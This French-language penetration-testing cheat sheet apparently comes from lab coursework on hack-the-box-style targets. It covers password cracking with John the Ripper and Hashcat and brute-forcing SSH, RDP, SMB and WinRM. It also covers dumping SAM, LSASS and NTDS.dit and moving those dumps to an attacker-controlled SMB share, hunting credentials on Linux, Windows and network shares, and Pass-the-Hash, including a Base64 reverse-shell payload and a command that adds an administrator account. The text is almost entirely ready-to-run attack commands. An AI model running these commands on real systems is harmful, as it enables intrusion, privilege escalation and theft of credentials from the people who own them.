# John The Ripper 

### Introduction

John the Ripper (john / JtR) est un outil open-source de référence pour le *password cracking* (brute-force, dictionnaire, etc.), avec de nombreux modes d’attaque et un support étendu de formats de hash.  
**Astuce** : Utiliser la version “jumbo” pour profiter de toutes les fonctionnalités.

## Modes d’attaque

### Single Crack Mode

**Utilise les infos du compte utilisateur (login, répertoire, GECOS) pour générer des mots de passe candidats.**
```bash
john --single <fichier_hash>
```
Exemple : Crack rapide basé sur les infos de l’utilisateur Linux (utile sur /etc/passwd ou /etc/shadow).

### Wordlist Mode (mode dictionnaire)

**Teste chaque mot d’un wordlist comme mot de passe candidat (attaque par dictionnaire).**
```bash
john --wordlist=<wordlist_file> <hash_file>
```
Possibilité d’ajouter `--rules` pour transformer les mots (capitalisation, ajouts de chiffres…).

### Incremental Mode (mode incrémental)

**Brute-force avancé basé sur des statistiques de mots de passe réels (Markov chain).**
```bash
john --incremental <hash_file>
```
Le plus exhaustif (et lent) : essaye toutes les combinaisons de caractères selon un charset défini.


## Identifier un format de hash

**Utilise hashid pour deviner le type de hash et obtenir la syntaxe John correspondante.**
```bash
hashid -j <hash>
```
Affiche tous les formats potentiels et la syntaxe --format=xxx à utiliser avec john.

### Spécifier le format de hash dans John

**Forcer le format de hash à utiliser si John ne détecte pas automatiquement.**
```bash
john --format=<format_john> <hash_file>
```

## Cracker des fichiers protégés (PDF, ZIP, RAR, etc.)

**Convertir un fichier en hash compatible John avec les outils *2john, puis cracker avec John.**
```bash
<tool> <fichier> > fichier.hash
john fichier.hash
```
Exemples d’outils :
- pdf2john, zip2john, rar2john, office2john, keepass2john, ssh2john, gpg2john, etc.

## Afficher les mots de passe crackés

**Afficher les résultats déjà trouvés par John.**
```bash
john --show <hash_file>
```
## Ressources complémentaires

- [Doc](https://github.com/openwall/john/tree/bleeding-jumbo/doc) (Openwall)
- [PentestMonkey hash formats](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)

# Hashcat

## Présentation

Hashcat est un puissant outil de *password cracking* multi-plateforme (Linux, Windows, macOS) optimisé GPU, supportant de nombreux formats de hash et modes d’attaque.  
Chaque mode ou format s’utilise via des options dédiées.


## Syntaxe Générale
```bash
hashcat -a <mode> -m <id_hash> <hashes> [wordlist, rule, mask, ...]
```

- `-a` : mode d’attaque (0 = dictionnaire, 3 = mask, etc.)
- `-m` : identifiant du type de hash (ex : 0 pour MD5, 1000 pour NTLM)
- `<hashes>` : fichier ou hash(s) à casser
- `[wordlist, rule, mask, ...]` : dépend du mode utilisé

## Identifier le type de hash

Lister tous les modes/ID supportés :
```bash
hashcat --help
```

## Dictionnaire (Dictionary Attack, -a 0)

Teste chaque mot du wordlist comme mot de passe candidat.
```bash
hashcat -a 0 -m <id_hash> <hash> <wordlist>
```

## Dictionnaire + Règles

Applique des transformations aux mots du wordlist pour générer plus de candidats.
```bash
hashcat -a 0 -m <id_hash> <hash> <wordlist> -r <fichier_regle>
```

Lister les règles disponibles :
```bash
ls /usr/share/hashcat/rules/
```

## Mask Attack (attaque par masque, -a 3)

Brute-force ciblé : définit le pattern de mot de passe à tester avec des masques.
```bash
hashcat -a 3 -m <id_hash> <hash> <mask>
```

**Symboles de masque principaux :**
- ?l : lettre minuscule
- ?u : lettre majuscule
- ?d : chiffre
- ?s : symbole spécial
- ?a : tous caractères imprimables

## Exemples d'options utiles

- Voir l’avancement :
```bash
hashcat --status
```

- Forcer l’utilisation CPU (au lieu de GPU) :
```bash
hashcat -D 1 ...
```
- Reprendre une session :
```bash
hashcat --restore
```

## Ressources utiles

- [Liste complète des hash modes Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Hashcat rules documentation](https://hashcat.net/wiki/doku.php?id=rule_based_attack)


---

# Cracking Protected Files

## Trouver des fichiers chiffrés / protégés

Rechercher les fichiers à extensions courantes (Office, PDF, etc.) sur un système Linux :
```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
echo -e "\nFile extension: $ext"
find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core"
done
```
*Cherche sur tout le disque les fichiers de type document potentiellement chiffrés/protégés.*

## Trouver des clés SSH privées

Chercher des clés SSH privées par leur entête (HEADER) :
```bash
grep -rnE '^-{5}BEGIN [A-Z0-9]+ PRIVATE KEY-{5}$' /* 2>/dev/null
```
*Repère tous les fichiers contenant une clé privée (RSA, ED25519, etc.).*

## Vérifier si une clé SSH est chiffrée

Lire la clé pour voir si elle demande une passphrase :
```bash
ssh-keygen -yf ~/.ssh/id_rsa
```

*Si elle est protégée, un prompt passphrase apparaît. Sinon, la clé publique s’affiche.*

## Extraire un hash depuis un fichier protégé (avec *2john)

Extraire le hash :
```bash
ssh2john.py SSH.private > ssh.hash
```

Cracker avec John :
```bash
john --wordlist=rockyou.txt ssh.hash
```

Afficher les résultats :
```bash
john ssh.hash --show
```

### Exemple : Cracker un document Office

Extraire le hash :
```bash
office2john.py Protected.docx > protected-docx.hash
```

Cracker : 
```bash
john --wordlist=rockyou.txt protected-docx.hash
```

### Exemple : Cracker un PDF protégé

Extraire le hash :
```bash
pdf2john.py PDF.pdf > pdf.hash
```

Cracker : 
```bash
john --wordlist=rockyou.txt pdf.hash
```

# Cracking Protected Archives

## Identifier les types d’archives courants

Lister toutes les extensions d’archives reconnues par FileInfo :
```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "." | tee -a compressed_ext.txt
```
*Génère une liste de toutes les extensions d’archives connues et l’enregistre dans `compressed_ext.txt`.*


## Cracker les fichiers ZIP protégés

Extraire le hash du ZIP avec zip2john et cracker :
```bash
zip2john ZIP.zip > zip.hash
```
```bash
john --wordlist=rockyou.txt zip.hash
```

## Cracker les fichiers GZIP chiffrés avec OpenSSL

Identifier le fichier :
```bash
file GZIP.gzip
```
*Exemple de résultat :*  
`GZIP.gzip: openssl enc'd data with salted password`

Bruteforce avec wordlist (boucle shell) :
```bash
for i in $(cat rockyou.txt); do
openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz
done
```
*Ignore les erreurs. Si le bon mot de passe est trouvé, les fichiers sont extraits dans le dossier courant.*

## Cracker un disque chiffré BitLocker

Extraire les hashs depuis le disque virtuel (ex : .vhd) :
```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker$0" backup.hashes > backup.hash
cat backup.hash
```

Craquer le hash BitLocker avec hashcat :
```bash
hashcat -a 0 -m 22100 <hash_bitlocker> <wordlist>
```

## Monter un disque BitLocker cracké

### Sous Windows

- Double-cliquer sur le `.vhd` : montez le disque.
- Double-cliquer sur le volume BitLocker : saisir le mot de passe cracké.

### Sous Linux (ou macOS) avec dislocker

Installer dislocker :
```bash
sudo apt-get install dislocker
```

Créer les dossiers de montage :
```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

Associer le .vhd à un loop device :
```bash
sudo losetup -f -P Backup.vhd
```

Déchiffrer la partition (remplacer `/dev/loop0p2` par la partition réelle, et `1234qwer` par le mot de passe trouvé) :
```bash
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
```

Monter le disque déchiffré :
```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Parcourir le contenu :
```bash
cd /media/bitlockermount/
ls -la
```

## Ressources utiles

- [Liste des types d’archives (FileInfo)](https://fileinfo.com/filetypes/compressed)
- [Dislocker (outil BitLocker Linux)](https://github.com/Aorimn/dislocker)
- [zip2john, bitlocker2john sur le dépôt John the Ripper](https://github.com/openwall/john/tree/bleeding-jumbo/run)


---

# Network Services

## Généralités

Sur un réseau, les services comme FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP et LDAP sont souvent exposés à l’attaque par mot de passe.  
Outils principaux : **NetExec**, **Hydra**, **Evil-WinRM**, **Metasploit**, **smbclient**, etc.

---

## WinRM

### Découverte & Brute Force (NetExec)
Outil polyvalent pour brute-force et post-exploitation sur de nombreux protocoles (SMB, WinRM, SSH, etc).

**Installation :**
```bash
sudo apt-get -y install netexec
```
Lister les options globales :
```bash
netexec -h
```

Attaquer un endpoint WinRM (bruteforce) :
```bash
netexec winrm <IP> -u <user|userlist> -p <pass|passlist>
```
*Le tag (Pwn3d!) dans la sortie indique un compte compromis.

## Brute Force de protocoles 
### SSH
Brute Force avec Hydra : 
```bash
hydra -L user.list -P password.list ssh://<IP>
```

### RDP (Remote Desktop Protocol)
Brute Force avec Hydra :
```bash
hydra -L user.list -P password.list rdp://<IP>
```

### SMB
Brute Force avec Hydra : 
```bash
hydra -L user.list -P password.list smb://<IP>
```

** Metasploit peut aussi brute force certains protocoles **

--- 

# Attacking SAM, SYSTEM, and SECURITY

## Registry Hives

| Hive                | Description                                                                          |
|---------------------|--------------------------------------------------------------------------------------|
| HKLM\SAM            | Password hashes des comptes locaux                                                   |
| HKLM\SYSTEM         | Clé de démarrage du système, nécessaire pour décrypter le SAM                        |
| HKLM\SECURITY       | Informations sensibles de LSA : caches DCC2, DPAPI keys, cleartext, etc.             |


## Dumper les hives localement

Ouvrir une invite **cmd.exe** en admin :
```bash
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

*Crée `sam.save`, `system.save`, `security.save` sur le système cible.*

## Transférer les hives sur l’attaquant

### Lancer un partage SMB sur l’attaquant

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<user>/Documents/
```


### Copier les fichiers depuis la machine Windows

```bash
move C:\sam.save \\<IP_attacker>\CompData
move C:\system.save \\<IP_attacker>\CompData
move C:\security.save \\<IP_attacker>\CompData
```

## Dumper les hashes avec secretsdump (Impacket)
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py
-sam sam.save -system system.save -security security.save LOCAL
```

*Affiche bootKey, SAM hashes, DCC2, LSA secrets, DPAPI keys, etc.*

## Cracker les NT hashes avec Hashcat

1. Extraire les NT hashes (colonne `nthash`) dans un fichier `hashes.txt`.  
2. Lancer Hashcat mode 1000 (NTLM) :
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Cracker les DCC2 hashes (cached domain creds)
```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25'
/usr/share/wordlists/rockyou.txt
```

*Mode 2100 – PBKDF2-based, beaucoup plus lent que NTLM.*

## Déchiffrer les DPAPI blobs (ex : Chrome)

Avec Mimikatz :
```bash
mimikatz.exe
dpapi::chrome /in:"C:\Users<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

*Récupère la clé AES puis les credentials stockés.*

## Dump à distance via NetExec

### LSA secrets
```bash
netexec smb <IP> --local-auth -u <user> -p <pass> --lsa
```

### SAM hashes
```bash
netexec smb <IP> --local-auth -u <user> -p <pass> --sam
```

*Permet de dumper SAM et LSA secrets sans accès physique.*

---

# Attacking LSASS

## Dumping LSASS Memory

### a. Task Manager (GUI)
1. Ouvrir Task Manager  
2. Onglet **Processes** → clic droit sur **Local Security Authority Process**  
3. **Create dump file** → `lsass.DMP` dans `%temp%`


## Récupérer le PID de LSASS

CMD :
```bash
tasklist /svc | findstr lsass
```    
*Affiche le PID de lsass.exe*

PowerShell :
```bash
Get-Process lsass
```  
*Affiche le PID de lsass (colonne Id)*

## Dumper la mémoire de LSASS

PowerShell (admin) :
```bash
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```
*Remplace <PID> par celui de lsass, crée le dump C:\lsass.dmp*

## Transférer le dump via SMB

Attaquant :
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE /chemin/vers/dossier
```
*Lance un partage SMB dans /chemin/vers/dossier* 


Cible :
```bash
move C:\lsass.dmp \\<ip_attaquant>\SHARE
```
*Envoie le dump vers le partage SMB*

## Extraction des credentials avec pypykatz

Attaquant :
```bash
pypykatz lsa minidump /chemin/vers/lsass.dmp
```
*Affiche les hashes/mots de passe/tickets Kerberos/masterkeys DPAPI*

## Cracker un hash NT
```bash
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
# Remplace <hash> par la valeur NT extraite (ex : NT : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx)
```
*Permet de récupérer le mot de passe du compte loggé.*

---

## Localisation des credentials Windows
```bash
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```
# Dossiers où Windows stocke les credentials chiffrés

## Exporter le Vault via interface
```bash
rundll32 keymgr.dll,KRShowKeyMgr
```

*Ouvre la fenêtre "Stored User Names and Passwords"*

## Lister les credentials du profil courant
```bash
cmdkey /list
```
*Affiche toutes les credentials stockées pour l'utilisateur courant*

## Utiliser un credential pour changer d'utilisateur
```bash
runas /savecred /user:<domaine\utilisateur> cmd
```
*Ouvre un shell cmd avec le compte précisé (si le mot de passe a déjà été enregistré)*

## Extraction de credentials en mémoire avec mimikatz (sur la cible)
```bash
privilege::debug
```
*Élévation des privilèges dans mimikatz*
```bash
sekurlsa::credman
```
*Récupère les credentials en mémoire (ex : login/MDP de services, RDP, sessions stockées...)*

## Outils alternatifs (pour extraction/offline/dump)

SharpDPAPI

*Dump/Decryption des creds protégés par DPAPI (outil C#)*

LaZagne

*Extraction de mots de passe locaux (multi-plateformes, supporte Credential Manager)*

DonPAPI

*Extraction automatisée de secrets DPAPI (local ou à distance, supporte vault/credentials)*


---

## Générer une wordlist de usernames à partir de noms
```bash
cat usernames.txt
```
*Créer une liste personnalisée de usernames à partir de noms trouvés (ex: via OSINT).*
```bash
./username-anarchy -i noms.txt
```
*Génère automatiquement différentes variantes classiques de usernames à partir d'une liste de prénoms/noms.*

## Enumérer les usernames valides sur AD avec Kerbrute
```bash
./kerbrute_linux_amd64 userenum --dc <IP_DC> --domain <domaine.local> noms.txt
```
*Teste chaque username de noms.txt pour vérifier s'il existe dans le domaine spécifié via le DC.*

## Brute-force sur comptes AD (SMB) avec NetExec
```bash
netexec smb <IP_DC> -u <user> -p <wordlist>
```
*Tente d'authentifier l'utilisateur sur SMB (port 445) du contrôleur AD, en testant chaque mot de passe de la wordlist.*

## Connexion à un DC avec Evil-WinRM
```bash
evil-winrm -i <IP_DC> -u <user> -p <password>
```
*Établit une session PowerShell distante sur la cible, si les identifiants sont valides.*

## Vérifier appartenance aux groupes locaux
```bash
net localgroup
```
*Liste les groupes locaux sur le DC et vérifie si le compte utilisé est Admin/Domaine Admin.*

## Vérifier les droits utilisateur/domain
```bash
net user <user>
```
*Affiche tous les détails du compte, y compris les groupes globaux (ex: Domain Admins).*

## Créer un shadow copy du disque (VSS)
```bash
vssadmin CREATE SHADOW /For=C:
```
*Crée une copie snapshot du disque C: pour permettre l'accès à NTDS.dit même si utilisé par AD.*

## Copier NTDS.dit depuis le shadow copy
```bash
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```
*Copie le fichier NTDS.dit depuis le snapshot vers un dossier temporaire (remplace X par l'ID du shadow).*

## Transférer NTDS.dit sur l’attaque host (via SMB)
```bash
cmd.exe /c move C:\NTDS\NTDS.dit \\<IP_ATTACK_HOST>\CompData
```
*Déplace NTDS.dit sur un partage SMB hébergé par l’attaque host (voir smbserver.py plus haut).*

## Extraire les hashes du NTDS.dit avec secretsdump (Impacket)
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
*Dump tous les hashes NT/LM du fichier NTDS.dit + SYSTEM récupérés sur le contrôleur de domaine.*

## Extraction automatique (NTDS.dit) via NetExec
```bash
netexec smb <IP_DC> -u <user> -p <password> -M ntdsutil
```
*Automatise la copie, extraction et dump des hashes du fichier NTDS.dit depuis un DC.*

## Cracker un hash NTLM avec hashcat
```bash
hashcat -m 1000 <hash_NTLM> /usr/share/wordlists/rockyou.txt
```
*Crack un hash NTLM extrait via brute-force/dictionary sur le hash.*

## Pass-the-Hash (PtH) avec Evil-WinRM
```bash
evil-winrm -i <IP_DC> -u <user> -H <hash_NTLM>
```
*Connexion à WinRM en utilisant directement le hash NTLM, sans besoin du mot de passe clair.*

---

# Localisation des credentials Windows

%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\

*Dossiers où Windows stocke les credentials chiffrés*

## Exporter le Vault via interface
```bash
rundll32 keymgr.dll,KRShowKeyMgr
```
*Ouvre la fenêtre "Stored User Names and Passwords"*

## Lister les credentials du profil courant
```bash
cmdkey /list
```
*Affiche toutes les credentials stockées pour l'utilisateur courant*

## Utiliser un credential pour changer d'utilisateur
```bash
runas /savecred /user:<domaine\utilisateur> cmd
```
*Ouvre un shell cmd avec le compte précisé (si le mot de passe a déjà été enregistré)*

## Extraction de credentials en mémoire avec mimikatz (sur la cible)
```bash
privilege::debug
```
*Élévation des privilèges dans mimikatz*
```bash
sekurlsa::credman
```
*Récupère les credentials en mémoire (ex : login/MDP de services, RDP, sessions stockées...)*

## Outils alternatifs (pour extraction/offline/dump)

SharpDPAPI
*Dump/Decryption des creds protégés par DPAPI (outil C#)*

LaZagne
*Extraction de mots de passe locaux (multi-plateformes, supporte Credential Manager)*

---

# Linux Authentication Process

## Vérifier si le hash du mot de passe est directement dans /etc/passwd (rare/old)
```bash
head -n 1 /etc/passwd
```
*Montre la 1ère ligne du fichier. Si le champ mot de passe (après le username) est vide (::), alors login sans mot de passe.*

## Lire l’historique des anciens mots de passe (opasswd PAM)
```bash
sudo cat /etc/security/opasswd
```
*Affiche les anciens hashes pour chaque utilisateur si la politique PAM l’impose (prévention du ré-usage).*

## Fusionner passwd et shadow pour attaque par hashcat/john (unshadow)
```bash
sudo cp /etc/passwd /tmp/passwd.bak
```
*Copie /etc/passwd dans /tmp pour éviter de toucher au fichier original.*

```bash
sudo cp /etc/shadow /tmp/shadow.bak
```
*Copie /etc/shadow dans /tmp (idem).*
```bash
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
*Crée un fichier combiné contenant login:hash pour être utilisé par John the Ripper ou hashcat.*

## Cracker les hashes avec hashcat
```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
*Crack les mots de passe UNIX (hash $6$, $y$, $5$ etc) en utilisant le dictionnaire rockyou.txt.*

## Types de hash courants dans /etc/shadow

* $1$  → MD5
* $2a$ → Blowfish
* $5$  → SHA-256
* $6$  → SHA-512
* $y$  → Yescrypt (par défaut sur Debian récentes)
* $7$  → Scrypt

*L’ID de hash se trouve au début du champ mot de passe dans /etc/shadow, entre deux $.*

---

# Credential Hunting in Linux

## Rechercher des fichiers de config contenant des credentials
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
*Recherche récursive de fichiers de config système et application par extension (hors dossiers non pertinents).*

## Chercher des credentials dans les fichiers de config trouvés
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
*Affiche les lignes pertinentes contenant "user", "password" ou "pass" dans les fichiers .cnf découverts.*

## Rechercher des bases de données et fichiers annexes
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
*Recherche tous les fichiers pouvant contenir des bases SQL, SQLite, ou autres formats courants de stockage de credentials.*

## Rechercher des fichiers de notes ou txt
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
*Liste tous les fichiers .txt ou sans extension dans les home users (idéal pour trouver des notes de passwords laissées par les users).*

## Rechercher des scripts contenant potentiellement des mots de passe
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
*Recherche tous les scripts et binaires potentiellement exploitables pour trouver des credentials hardcodés ou des secrets.*

## Vérifier le contenu du crontab système (et des cron.d/ cron.daily/ etc.)
```bash
cat /etc/crontab
```
*Affiche les tâches automatisées du système, parfois avec des credentials en clair dans les commandes/scripts appelés.*

```bash
ls -la /etc/cron.*/
```
*Liste les fichiers exécutés automatiquement par cron, souvent porteurs de secrets ou variables d’environnement sensibles.*

## Lire l’historique des commandes pour trouver des credentials passés
```bash
tail -n5 /home/*/.bash*
```
*Affiche les dernières commandes tapées par chaque utilisateur. Peut révéler des commandes avec mots de passe (ex: su, scripts, etc).*

## Analyser les logs systèmes pour y trouver des connexions, sudo, échecs, etc.
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
*Cherche les mots-clés intéressants dans tous les logs pour repérer des mots de passe, des sudo ou des connexions.*

## Dumper les credentials présents en mémoire (root requis) avec mimipenguin
```bash
sudo python3 mimipenguin.py
```
*Extracte les mots de passe UNIX, SSH, sudo, etc. depuis la mémoire vive (nécessite d’être root).*

## Extraction de credentials de plein d’emplacements avec LaZagne
```bash
sudo python2.7 laZagne.py all
```
*Lance tous les modules LaZagne pour dumper un maximum de credentials connus du système.*

## Chercher les profils Firefox sur le système
```bash
ls -l .mozilla/firefox/ | grep default
```
*Liste les profils Firefox, utiles pour extraire les credentials sauvegardés du navigateur.*

## Lire le fichier logins.json de Firefox
```bash
cat .mozilla/firefox/<profil>/logins.json | jq .
```
*Affiche le contenu (chiffré) des logins sauvegardés (user/pass/URL), à décrypter ensuite avec un outil externe.*

## Décrypter les mots de passe Firefox avec Firefox_decrypt
```bash
python3.9 firefox_decrypt.py
```
*Décrypte automatiquement les credentials Firefox du profil sélectionné (si accès fichiers).*

## Extraire les mots de passe browsers avec LaZagne
```bash
python3 laZagne.py browsers
```
*Dumpe tous les credentials trouvés dans les navigateurs supportés (dont Firefox, Chromium, etc).*

---
# Credential Hunting in Network Traffic

## Filtrer le trafic réseau dans Wireshark pour trouver des credentials
```bash
ip.addr == <IP>
```
*Filtre les paquets avec l'adresse IP spécifiée.*
```bash
tcp.port == 80
```
*Filtre le trafic sur le port HTTP (80).*
```bash
http
```
*Affiche uniquement le trafic HTTP (pratique pour trouver des creds en clair).*

```bash
http.request.method == "POST"
```
*Affiche les requêtes POST HTTP (souvent porteuses de credentials).*

```bash
http contains "passw"
```
*Filtre les paquets HTTP contenant la chaîne "passw" (pour repérer les champs password, pass, etc.).*

```bash
tcp.stream eq <N>
```
*Affiche la conversation TCP numéro N (permet de suivre un échange complet login/mot de passe).*

```bash
eth.addr == <MAC>
```
*Filtre sur une adresse MAC précise.*

```bash
ip.src == <IP_SRC> && ip.dst == <IP_DST>
```
*Affiche le trafic entre deux IP précises (utile pour tracker la comm entre deux machines cibles).*

```bash
icmp
```
*Filtre le trafic ICMP (ping, reconnaissance réseau).*

## Astuce : Rechercher une chaîne spécifique dans Wireshark
```bash
Edit > Find Packet > Search (String)
```
*Permet de chercher manuellement une chaîne précise (ex: "password", "login", "auth") dans les paquets capturés.*

## Extraire rapidement les credentials dans un .pcap/.pcapng avec Pcredz
```bash
./Pcredz -f <capture.pcapng> -t -v
```
*Scanne un fichier de capture réseau (.pcap, .pcapng) et extrait automatiquement credentials, hashs NTLM, mots de passe HTTP, creds FTP, SNMP, IMAP, SMTP, POP3, CB de façon automatisée.*

## Exemples de credentials trouvables en clair dans le trafic réseau

- HTTP : Authentification Basic/NTLM, formulaire de login en POST
- FTP : User/Password en clair sur port 21
- SNMP : Community string (v1/v2c)
- POP3/IMAP/SMTP : Login/Password (vérifier STARTTLS)
- LDAP : Simple bind en clair (hors LDAPS)
- SMBv1/2, RPC, MSSQL : Hashs NTLMv1/v2 dans les échanges réseau
- VNC, Telnet : login/password en clair si pas d’option TLS/SSL

---

# Credential Hunting in Network Shares

## Général - Patterns et extensions à cibler

- Chercher dans les noms/fichiers : passw, user, token, key, secret, config, cred, initial
- Extensions typiques : .ini, .cfg, .env, .ps1, .bat, .xlsx, .xml, .json, .bak, .db, .txt, .vbs, .yml, .kdbx
- Adapter les mots-clés au contexte linguistique ou métier de la cible

## Recherche manuelle sur un partage SMB depuis Windows

```powershell
Get-ChildItem -Recurse -Include *.ps1,*.bat,*.env,*.txt,*.xml,*.json \\Serveur\Share | Select-String -Pattern "passw|user|token|key|secret"
```
*Recherche récursive dans tous les fichiers ayant certaines extensions pour des mots-clés liés aux credentials.*

## Snaffler (Windows)
```powershell
Snaffler.exe -s
```
*Scan automatique de tous les partages accessibles, télécharge les fichiers considérés “intéressants” (credentials, configs, scripts, etc).*
[Snaffler](https://github.com/SnaffCon/Snaffler)

-u : Recherche des références à des utilisateurs AD dans les fichiers

-i et -n : Spécifier les partages à inclure dans le scan

## PowerHuntShares (Windows, PowerShell)
```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```
*Script PowerShell pour recenser, lister, et analyser les droits sur tous les partages SMB du domaine. Génère un rapport HTML avec les fichiers sensibles trouvés.*
[PowerHuntShares](https://github.com/NetSPI/PowerHuntShares)

## MANSPIDER (Linux via Docker)
```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <IP_SMB> -c 'passw' -u '<user>' -p '<password>'
```
*Scanne le partage SMB ciblé pour tous les fichiers contenant la chaîne "passw" dans leur contenu. Télécharge automatiquement les fichiers suspects pour analyse ultérieure.*

## NetExec (Linux, analyse SMB à distance)
```bash
nxc smb <IP_SMB> -u <user> -p '<password>' --spider <SHARE> --content --pattern "passw"
```
*Recherche tous les fichiers contenant "passw" dans leur contenu sur un partage SMB donné, possibilité de matcher sur d’autres patterns.*

--- 

# Pass the Hash (PtH)

## Mimikatz – sekurlsa::pth  
```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe"
exit
```
*Lance cmd.exe sous le contexte de l’utilisateur julio en utilisant son hash NTLM.*

## Invoke-TheHash – SMB
```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec `
  -Target 172.16.1.10 `
  -Domain inlanefreight.htb `
  -Username julio `
  -Hash 64F12CDDAA88057E06A81B54E73B949B `
  -Command "net user mark Password123 /add && net localgroup administrators mark /add"
```
*Crée l’utilisateur mark et l’ajoute au groupe Administrators sur la machine cible via SMB.*

## Invoke-TheHash – WMI
```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec `
  -Target DC01 `
  -Domain inlanefreight.htb `
  -Username julio `
  -Hash 64F12CDDAA88057E06A81B54E73B949B `
  -Command "powershell -e <Base64_ReverseShell>"
```
*Exécute un payload PowerShell (reverse shell encodé en Base64) via WMI sur DC01.*

## Impacket
### Impacket – PsExec
```powershell
impacket-psexec administrator@10.129.201.126 \
  -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
*Ouvre un shell sous Administrator en passant son hash NTLM via PsExec.*

### Impacket – Autres commandes
wmiexec
```powershell
impacket-wmiexec administrator@10.129.201.126 \
  -hashes :<NTLM_HASH>
```
*Exécute une commande distante via WMI.*

atexec
```powershell
impacket-atexec administrator@10.129.201.126 \
  -hashes :<NTLM_HASH>
```
*Exécute un service temporaire pour lancer une commande.*

smbexec
```powershell
impacket-smbexec administrator@10.129.201.126 \
  -hashes :<NTLM_HASH>
```
*Exécute une commande distante en utilisant SMB.*

## NetExec
### NetExec – Scan SMB
```powershell
netexec smb 172.16.1.0/24 \
  -u Administrator -d . \
  -H 30B3783CE2ABF1AF70F77D0660CF3453
```
*Balaye le sous-réseau pour détecter où le hash permet un accès SMB (Pwn3d! indique succès).*

### NetExec – Exécution de commandes
```powershell
netexec smb 10.129.201.126 \
  -u Administrator -d . \
  -H 30B3783CE2ABF1AF70F77D0660CF3453 \
  -x whoami
```
*Exécute whoami sur la cible via SMB en utilisant le hash NTLM.*

### Evil-WinRM
```powershell
evil-winrm -i 10.129.201.126 \
  -u Administrator \
  -H 30B3783CE2ABF1AF70F77D0660CF3453
```
*Ouvre une session PowerShell distante via WinRM en passant le hash NTLM.*

### RDP – Mode Restricted Admin
```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa `
  /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
*Active le mode Restricted Admin pour autoriser PtH sur RDP.*
*Se connecte en RDP à la machine cible en passant le hash NTLM.*

---

# Pass the Ticket (PtT)

## Exporter les tickets avec Mimikatz  
```powershell 
mimikatz.exe privilege::debug  
sekurlsa::tickets /export  
exit  
```
*Extrait tous les tickets Kerberos (.kirbi) du processus LSASS*

## Exporter les tickets avec Rubeus  
```powershell  
Rubeus.exe dump /nowrap  
```
*Affiche tous les tickets Kerberos en Base64 pour un copier-coller facile*

